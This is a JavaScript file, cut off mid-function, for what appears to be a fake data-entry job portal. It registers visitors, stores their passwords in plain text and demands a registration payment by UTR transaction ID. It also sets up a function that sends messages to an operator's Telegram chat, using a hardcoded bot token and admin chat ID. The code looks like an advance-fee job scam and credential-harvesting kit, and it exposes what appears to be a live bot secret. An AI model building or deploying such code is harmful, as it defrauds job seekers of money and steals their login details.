const jobBank = [
    "Global logistics corporations require precise indexing of electronic waybills. Maintaining structured record inputs ensures timely international cargo dispatchments.",
    "Financial institutions systematically evaluate digital ledgers to cross-verify transactional validity. Security audits depend strictly on high accuracy transcription workflows.",
    "Healthcare infrastructures benefit significantly from cloud-hosted patient indexing. Data operators must process categorical documentation without structural deviations."
];

// ⚠️ APNI TELEGRAM CONFIGURATION DETAILS YAHAN BHAREIN:
const TG_BOT_TOKEN = "8934210193:AAF_Ko9AVaEMnyeSY-btGRUxxzjsFzB81i0"; 
const TG_ADMIN_CHAT_ID = "7542727300"; 

let activeSessionUser = null;
let temporaryUserRegData = null;

function toggleScreens(showRegister) {
    document.getElementById('register-card').style.display = showRegister ? 'block' : 'none';
    document.getElementById('login-card').style.display = showRegister ? 'none' : 'block';
}

// Telegram sync trigger function
async function syncDataToTelegramLog(messageText) {
    const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TG_ADMIN_CHAT_ID,
                text: messageText,
                parse_mode: "Markdown"
            })
        });
    } catch (e) {
        console.log("Telegram sync delayed or blocked:", e);
    }
}

// 1. Process Registration Phase
function processRegister() {
    const name = document.getElementById('reg-name').value.trim();
    const email = document.getElementById('reg-email').value.trim();
    const pass = document.getElementById('reg-pass').value.trim();

    if(!name || !email || !pass) {
        alert("🚨 System Notification: All registration details are mandatory.");
        return;
    }

    let database = JSON.parse(localStorage.getItem('cloud_users')) || {};
    if(database[email]) {
        alert("🔒 Profile Error: This contractor profile already exists. Please login.");
        return;
    }

    // Work ID creation algorithm
    const randomWorkID = "FW-" + Math.floor(1000 + Math.random() * 9000);
    temporaryUserRegData = { name, email, pass, workId: randomWorkID };

    document.getElementById('auth-block').style.display = 'none';
    document.getElementById('payment-block').style.display = 'block';
}

// 2. Payment Submission Logic with auto bot triggers
async function verifyPayment() {
    const utr = document.getElementById('utr-input').value.trim();
    
    if(utr.length < 12 || isNaN(utr)) {
        alert("❌ Invalid UTR/Txn ID: Provide valid 12-digit payment transaction sequence.");
        return;
    }

    let database = JSON.parse(localStorage.getItem('cloud_users')) || {};
    
    database[temporaryUserRegData.email] = {
        name: temporaryUserRegData.name,
        password: temporaryUserRegData.pass,
        workId: temporaryUserRegData.workId,
        utr: utr,
        wallet: 0.00,
        tasks: 0
    };
  
